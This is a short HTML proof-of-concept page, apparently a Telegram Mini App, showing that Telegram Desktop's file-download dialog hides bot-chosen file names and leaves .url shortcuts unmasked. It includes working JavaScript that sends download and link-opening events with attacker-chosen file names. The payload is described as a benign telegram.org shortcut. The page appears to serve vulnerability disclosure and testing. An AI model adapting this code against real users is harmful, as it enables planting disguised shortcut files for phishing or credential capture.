<!doctype html>
<!--
PoC - Telegram Desktop Mini App download dialog hides the file name, and the
save-time masking only covers .lnk/.scf, so a bot-chosen .url name is written
unmasked into Downloads/Telegram Desktop/.

Button (a): downloads a .txt (name "Report (final).txt").
Button (b): downloads a benign internet shortcut under the name "Facture.url"
            (content points to telegram.org; this only tests that the .url
            extension is written unmasked, not credential theft).
Button (c): web_app_open_tg_link to a direct-link app with write_allowed.
-->
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>download dialog test</title>
<style>body{font-family:sans-serif;padding:16px;font-size:15px}
button{display:block;width:100%;padding:14px;margin:10px 0;font-size:15px}
code{background:#eee;padding:2px 4px;border-radius:3px;word-break:break-all}</style>
</head><body>
<p>This Mini App asks Telegram to download a file whose name it chooses:</p>
<button onclick="dl('Report (final).txt','poc.txt')">(a) download as "Report (final).txt"</button>
<button onclick="dl('Facture.url','shortcut.url')">(b) download as "Facture.url"</button>
<button onclick="tg()">(c) open app with write_allowed</button>
<p id="log"></p>
<script>
function here(f){ return location.origin + location.pathname.replace(/[^/]*$/, '') + f; }
function post(ev, data) {
  if (window.TelegramWebviewProxy) window.TelegramWebviewProxy.postEvent(ev, JSON.stringify(data));
  else if (window.parent) window.parent.postMessage(JSON.stringify({eventType: ev, eventData: data}), '*');
  document.getElementById('log').textContent = 'sent ' + ev + ' (' + JSON.stringify(data) + ')';
}
function dl(name, file) {
  post('web_app_request_file_download', { url: here(file), file_name: name });
}
function tg() {
  post('web_app_open_tg_link', { path_full: '/poccchunterbot/app' });
}
</script>
</body></html>
